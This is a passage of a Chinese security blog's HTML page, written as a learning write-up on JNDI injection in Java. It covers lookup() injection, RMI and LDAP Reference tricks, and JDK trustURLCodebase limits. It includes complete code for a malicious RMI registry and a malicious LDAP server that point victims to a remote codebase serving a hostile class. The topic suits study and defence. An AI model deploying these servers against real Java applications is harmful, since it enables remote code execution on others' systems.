class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Registry registry = LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br><br>        Reference evil = <span class="hljs-keyword">new</span> Reference(<span class="hljs-string">&quot;Evil&quot;</span>,<span class="hljs-string">&quot;Evil&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:8080/&quot;</span>);<br>        ReferenceWrapper r = <span class="hljs-keyword">new</span> ReferenceWrapper(evil);<br>        System.out.println(<span class="hljs-string">&quot;Binding is Evil to rmi://127.0.0.1:1099/evilObj&quot;</span>);<br>        registry.bind(<span class="hljs-string">&quot;evilObj&quot;</span>,r);<br><br><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>



<p><img src="https://img-blog.csdnimg.cn/8b335711c579457aac7d1fc98bcd77b5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<p>这里会报错是因为最后实例化远程类(<code>EvilObj</code>)的时候进行了类型转换为<code>ObjectFactory</code>类，而该类实际上是一个接口，所以如果要让它不报错就实现接口里面的方法就行了，而这个接口就只有一个方法。</p>
<p><img src="https://img-blog.csdnimg.cn/7cfa5314fb65423f8d614bae87269992.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>其实每次在调试的过程中总能学到很多陌生的东西，但是这些东西很少记录下来，以至于调试完就没有后续了，调试中遇到了一个很常见但是方法很多的东西就是java字节码的加载，在调用<code>getObjectFactoryFromReference</code>方法要返回实例化的注册类时，这里用了<code>static final VersionHelper helper = VersionHelper.getVersionHelper();</code>的加载方法</p>
<p><img src="https://img-blog.csdnimg.cn/9f1deea18f684ef7b5120c43ff52e968.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<p>经过搜索之后发现在<code>JSP Webshell</code>经常出现这个身影，所以中间又穿插学了下<code>JSP Webshell</code>，属于看啥啥不会了，<code>JSP Webshell</code>应该会再写一篇博客了。这里简单记录一下。</p>
<h2 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h2><h4 id="lookup参数注入"><a href="#lookup参数注入" class="headerlink" title="lookup参数注入"></a><code>lookup</code>参数注入</h4><p>这种漏洞就是上面所演示的，<code>ctx.lookup()</code>中参数可控，然后动态加载我们的恶意类</p>
<h4 id="classFactoryLocation参数注入"><a href="#classFactoryLocation参数注入" class="headerlink" title="classFactoryLocation参数注入"></a><code>classFactoryLocation</code>参数注入</h4><p>前面lookup()参数注入是基于RMI客户端的，也是最常见的。而<code>classFactoryLocation</code>参数注入则是对于RMI服务端而言的，也就是说服务端程序在调用Reference()初始化参数时，其中的<code>classFactoryLocation</code>参数外部可控，导致存在JNDI注入。如图</p>
<p><img src="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/10.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>将上述的JNDI客户端稍作修改即可，可以看到lookup参数已经固定而服务端参数可控。但是这里注意因为lookup直接查询远程引用对象，所以需要初始化上下文告诉客户端使用什么目录服务，并且提供服务<code>url</code>地址。</p>
<p> <img src="https://img-blog.csdnimg.cn/3233c91e345d4d6387c13d108f568eaf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/2f508d2b36cd459bae4ccb87fe1f6b78.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<h4 id="RMI恶意远程对象"><a href="#RMI恶意远程对象" class="headerlink" title="RMI恶意远程对象"></a>RMI恶意远程对象</h4><blockquote>
<p>攻击者实现一个RMI恶意远程对象并绑定到RMI Registry上，编译后的RMI远程对象类可以放在HTTP/FTP/SMB等服务器上，这个Codebase地址由远程服务器的 java.rmi.server.codebase 属性设置，供受害者的RMI客户端远程加载，RMI客户端在 lookup() 的过程中，会先尝试在本地CLASSPATH中去获取对应的Stub类的定义，并从本地加载，然而如果在本地无法找到，RMI客户端则会向远程Codebase去获取攻击者指定的恶意对象，这种方式将会受到 useCodebaseOnly 的限制。利用条件如下：</p>
<ol>
<li>RMI客户端的上下文环境允许访问远程Codebase。</li>
<li>属性 java.rmi.server.useCodebaseOnly 的值必需为false。</li>
</ol>
<p>然而从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前VM的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</p>
<p>Changelog:</p>
<ul>
<li>JDK 6u45 <a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html</a></li>
<li>JDK 7u21 <a target="_blank" rel="noopener" href="http://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html">http://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></li>
</ul>
</blockquote>
<h4 id="结合反序列化漏洞"><a href="#结合反序列化漏洞" class="headerlink" title="结合反序列化漏洞"></a>结合反序列化漏洞</h4><p>这种情形其实就是漏洞类重写的readObject()方法中直接或间接调用了可被外部控制的lookup()方法，导致攻击者可以通过JNDI注入来进行反序列化漏洞的利用。</p>
<p>例如<code>Spring Framework的反序列化漏洞</code></p>
<h4 id="LDAP-Reference利用技巧"><a href="#LDAP-Reference利用技巧" class="headerlink" title="LDAP+Reference利用技巧"></a>LDAP+Reference利用技巧</h4><p>原理是一样的，也是起一个恶意的服务，只是从RMI服务变成了LDAP服务，都是能对接JNDI客户端并且返回Reference对象的。</p>
<p>LDAP (Lightweight Directory Access Protocol) : 轻量目录访问协议</p>
<blockquote>
<p>LDAP是一个跨平台的、标准的协议</p>
<p>LDAP支持TCP/IP</p>
<p>LDAP也是有client端和server端。server端是用来存放资源，client端用来操作增删改查等操作</p>
<p>LDAP是一个到目录服务的目录访问协议</p>
<p>目录服务：简单来讲是为了浏览和搜索数据而设计的特殊数据库（很像通讯簿，由以字母顺序排列的名字、地址和电话号码组成）</p>
<p>LDAP 类似于用一个树状结构将数据联系起来(和查询DNS服务挺类似的)，大致如图所示：</p>
</blockquote>
<p><img src="https://c014.cn/blog/java/pics/13.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
<h5 id="LDAP-常见名词"><a href="#LDAP-常见名词" class="headerlink" title="LDAP 常见名词"></a>LDAP 常见名词</h5><table>
<thead>
<tr>
<th align="center">缩写</th>
<th align="center">全称</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">dc</td>
<td align="center">Domain Component</td>
<td align="center">域名的部分，其格式是将完整的域名分成几部分，如dc=domain,dc=com</td>
</tr>
<tr>
<td align="center">uid</td>
<td align="center">User Id</td>
<td align="center">用户ID, 如”test”</td>
</tr>
<tr>
<td align="center">ou</td>
<td align="center">Organization Unit</td>
<td align="center">组织单位，类似于Linux文件系统中的子目录，是一个容器对象，可以包含其他各种对象</td>
</tr>
<tr>
<td align="center">cn</td>
<td align="center">Common Name</td>
<td align="center">公共名称</td>
</tr>
<tr>
<td align="center">sn</td>
<td align="center">Surname</td>
<td align="center">姓</td>
</tr>
<tr>
<td align="center">dn</td>
<td align="center">Distinguished Name</td>
<td align="center">唯一辨别名，类似于绝对路径，如”uid=test,ou=sec,dc=domain,dc=com”,在一个目录树中dn总是唯一的</td>
</tr>
<tr>
<td align="center">rdn</td>
<td align="center">Relative dn</td>
<td align="center">相对辨别名，类似相对路径</td>
</tr>
<tr>
<td align="center">c</td>
<td align="center">Country</td>
<td align="center">国家</td>
</tr>
<tr>
<td align="center">o</td>
<td align="center">Organization</td>
<td align="center">组织名</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center"></th>
<th align="center"></th>
</tr>
</thead>
<tbody><tr>
<td align="center">Directory</td>
<td align="center">目录，用于存放信息的单元</td>
</tr>
<tr>
<td align="center">Entry</td>
<td align="center">条目，一个entry就是一条记录，是LDAP中一个基本的存储单元</td>
</tr>
<tr>
<td align="center">DN：Distinguished Name</td>
<td align="center">条目中用于唯一区别改条目的信息</td>
</tr>
<tr>
<td align="center">LDIF：LDAP Interchange Format</td>
<td align="center">用于规范LDAP的配置和目录内容等详细信息的保存</td>
</tr>
<tr>
<td align="center">Objectclass</td>
<td align="center">LDAP对象类，是LDAP内置的数据模型。每种objectClass有自己的数据结构</td>
</tr>
</tbody></table>
<p><code>LDAP</code>的具体知识可以看看这篇文章<a target="_blank" rel="noopener" href="https://www.cnblogs.com/kevingrace/p/5773974.html%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%BB%E8%A6%81%E7%9C%8B%E7%9C%8BLDAP%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">https://www.cnblogs.com/kevingrace/p/5773974.html，这里主要看看LDAP的漏洞利用</a></p>
<p><strong>目录树概念</strong></p>
<ul>
<li>目录树：在一个目录服务系统中，整个目录信息集可以表示为一个目录信息树，树中的每个节点是一个条目</li>
<li>条目：每个条目就是一条记录，每个条目有自己的唯一可区别的名称（DN）</li>
<li>对象类：与某个实体类型对应的一组属性，对象类是可以继承的，这样父类的必须属性也会被继承下来</li>
<li>属性：描述条目的某个方面的信息，一个属性由一个属性类型和一个或多个属性值组成，属性有必须属性和非必须属性。如<code>javaCodeBase</code>、<code>objectClass</code>、<code>javaFactory</code>、<code>javaSerializedData</code>、<code>javaRemoteLocation</code>等属性，在后面的利用中会用到这些属性</li>
</ul>
<h5 id="LDAP攻击"><a href="#LDAP攻击" class="headerlink" title="LDAP攻击"></a>LDAP攻击</h5><p>这里演示一个样例</p>
<p>客户端</p>
<p><img src="https://img-blog.csdnimg.cn/fbcad8b9a8434d43a31fec71fdce31fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<p>服务端，网上得代码自己搜索做了一些注释</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> JDNI.com.RMIattack;<br><br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchEntry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LdapServer</span> </span>&#123;<br>    <span class="hljs-comment">//域名的部分，其格式是将完整的域名分成几部分，如域名为example.com变成dc=example,dc=com</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String LDAP_BASE = <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        String url = <span class="hljs-string">&quot;http://127.0.0.1:8000/#Evil2&quot;</span>;<br>        <span class="hljs-keyword">int</span> port = <span class="hljs-number">2333</span>;<br><br>        <span class="hljs-comment">//创建一个新的内存目录服务器配置对象</span><br>        InMemoryDirectoryServerConfig config = <span class="hljs-keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);<br>        <span class="hljs-comment">//配置在内存目录服务器中使用的侦听器</span><br>        config.setListenerConfigs(<span class="hljs-keyword">new</span> InMemoryListenerConfig(<br>           <span class="hljs-string">&quot;listen&quot;</span>, <span class="hljs-comment">//分配给此侦听器的名称</span><br>           InetAddress.getByName(<span class="hljs-string">&quot;127.0.0.1&quot;</span>),<span class="hljs-comment">// 侦听器应接受来自客户端的连接的地址。它可能 null表明它应该接受所有接口上所有地址上的连接。</span><br>                port, <span class="hljs-comment">//侦听器应接受来自客户端的连接的端口</span><br>                ServerSocketFactory.getDefault(), <span class="hljs-comment">//接受客户端连接时应用于创建套接字的套接字工厂</span><br>                SocketFactory.getDefault(), <span class="hljs-comment">// 应用于创建与服务器的客户端连接的套接字工厂</span><br>                (SSLSocketFactory) SSLSocketFactory.getDefault() <span class="hljs-comment">//应用于将 StartTLS 加密添加到现有连接的套接字工厂</span><br>        ));<br><br>        config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> OperationInterceptor(<span class="hljs-keyword">new</span> URL(url)));<br>        InMemoryDirectoryServer ds = <span class="hljs-keyword">new</span> InMemoryDirectoryServer(config);<br>        System.out.println(<span class="hljs-string">&quot;LDAP server is listening on 0.0.0.0:2333&quot;</span>);<br>        ds.startListening();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">InMemoryOperationInterceptor</span></span>&#123;<br>        <span class="hljs-keyword">private</span> URL codebase;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">OperationInterceptor</span><span class="hljs-params">(URL cb)</span></span>&#123;<br>            <span class="hljs-keyword">this</span>.codebase = cb;<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">processSearchResult</span> <span class="hljs-params">(InMemoryInterceptedSearchResult result)</span></span>&#123;<br>            String base = result.getRequest().getBaseDN();<br>            Entry e = <span class="hljs-keyword">new</span> Entry(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result,base,e);<br>            &#125;<span class="hljs-keyword">catch</span> (Exception p)&#123;<br>                p.printStackTrace();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@param</span> result  an API that can be used in the course of processing a search request via the InMemoryOperationInterceptor API.</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@param</span> base 根节点</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@param</span> e 需要搜索的条目信息</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sendResult</span><span class="hljs-params">(InMemoryInterceptedSearchResult result, String base,Entry e)</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException </span>&#123;<br>            URL turl = <span class="hljs-keyword">new</span> URL(<span class="hljs-keyword">this</span>.codebase,<span class="hljs-keyword">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>)); <span class="hljs-comment">//构造我们恶意类的名字 这里为EEvil2.class</span><br>            <br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            <span class="hljs-comment">//设置JavaClassName属性值</span><br>            e.addAttribute(<span class="hljs-string">&quot;JavaClassName&quot;</span>,<span class="hljs-string">&quot;Exploit&quot;</span>);<br>            String cbString = <span class="hljs-keyword">this</span>.codebase.toString();<br>            <span class="hljs-keyword">int</span> refPos = cbString.indexOf(<span class="hljs-string">&quot;#&quot;</span>);<br>            <span class="hljs-keyword">if</span> (refPos&gt;<span class="hljs-number">0</span>)&#123;<br>                cbString = cbString.substring(<span class="hljs-number">0</span>,refPos); <span class="hljs-comment">//获取代码库url</span><br>            &#125;<br>            <span class="hljs-comment">//设置一些相关得属性</span><br>            e.addAttribute(<span class="hljs-string">&quot;javaCodeBase&quot;</span>,cbString);<br>            e.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>,<span class="hljs-string">&quot;javaNamingReference&quot;</span>);<br>            e.addAttribute(<span class="hljs-string">&quot;javaFactory&quot;</span>,<span class="hljs-keyword">this</span>.codebase.getRef());  <span class="hljs-comment">//工厂名Evil2</span><br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> LDAPResult(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br>    &#125;<br><br>&#125;<br><br></code></pre></div></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/7cd47081e3d04380b549a4e2fdb04318.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<p>但是上面我用的<code>jdk1.8.0_312</code>导致需要设置<code>System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;);</code>最开始没加上浪费了些时间，不过调试找bug的过程也很受益。其实调试过上面的RMI的过程之后，对于LDAP的调试会熟悉很多。经过调试LDAPclient可以发现，其实只是前面的某些方法所在的类不太一样，但最终还是得回到方法<code>getObjectFactoryFromReference</code>所以我们直接在这个地方打断点。</p>
<p>跟进字节码得加载</p>
<p><img src="https://img-blog.csdnimg.cn/fcc09bbdbeb1486c8903e70b3759c186.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<p>可以发现在<code>loadClass:110, VersionHelper12 (com.sun.naming.internal)</code>中进行了一个if判断当不设置成false得时候不会进行下面的<code>URLClassLoader.newInstance(getUrlArray(codebase), parent);</code></p>
<p><img src="https://img-blog.csdnimg.cn/709b6a01fb624636884836a797ee31df.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<p>但是注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的<code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，<code>com.sun.jndi.ldap.object.trustURLCodebase</code>属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制。</p>
<h1 id="Spring-Framework反序列化漏洞分析"><a href="#Spring-Framework反序列化漏洞分析" class="headerlink" title="Spring Framework反序列化漏洞分析"></a>Spring Framework反序列化漏洞分析</h1><p>下一篇博客写吧太长了。。</p>
<p>参考文章</p>
<p><a target="_blank" rel="noopener" href="https://c014.cn/blog/java/Java%20%E5%8D%87%E7%BA%A7%E4%B9%8B%E8%B7%AF%EF%BC%88%E5%85%AD%EF%BC%89LDAP.html">https://c014.cn/blog/java/Java%20%E5%8D%87%E7%BA%A7%E4%B9%8B%E8%B7%AF%EF%BC%88%E5%85%AD%EF%BC%89LDAP.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.crisprx.top/archives/389#Spring_Framework_RCE">https://www.crisprx.top/archives/389#Spring_Framework_RCE</a></p>
<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/#0x01-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5">https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/#0x01-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5</a></p>
<p><a target="_blank" rel="noopener" href="https://zjxkenshine.github.io/2018/04/19/%E6%95%B0%E6%8D%AE%E8%BF%9E%E6%8E%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9AJNDI%E5%85%A5%E9%97%A8%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%BA%90%E9%85%8D%E7%BD%AE/">https://zjxkenshine.github.io/2018/04/19/%E6%95%B0%E6%8D%AE%E8%BF%9E%E6%8E%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9AJNDI%E5%85%A5%E9%97%A8%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%BA%90%E9%85%8D%E7%BD%AE/</a></p>
<p><a target="_blank" rel="noopener" href="https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/">https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/</a></p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/131">https://security.tencent.com/index.php/blog/msg/131</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/253545.html">https://www.freebuf.com/vuls/253545.html</a></p>


  
</article>

              </div>
            </div>
          </div>
        </div>
      </div>
    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  
  <!-- 备案信息 -->
  <div class="beian">
    <span>
      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
        京ICP证123456号
      </a>
    </span>
    
      
        <span>
          <a
            href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12345678"
            rel="nofollow noopener"
            class="beian-police"
            target="_blank"
          >
            
              <span style="visibility: hidden; width: 0">|</span>
              <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
            
            <span>京公网安备12345678号</span>
          </a>
        </span>
      
    
  </div>


  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/img-lazyload.js" ></script>
  



  







  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>



  <script  src="/js/local-search.js" ></script>






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>












  

  

  

  

  

  





<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
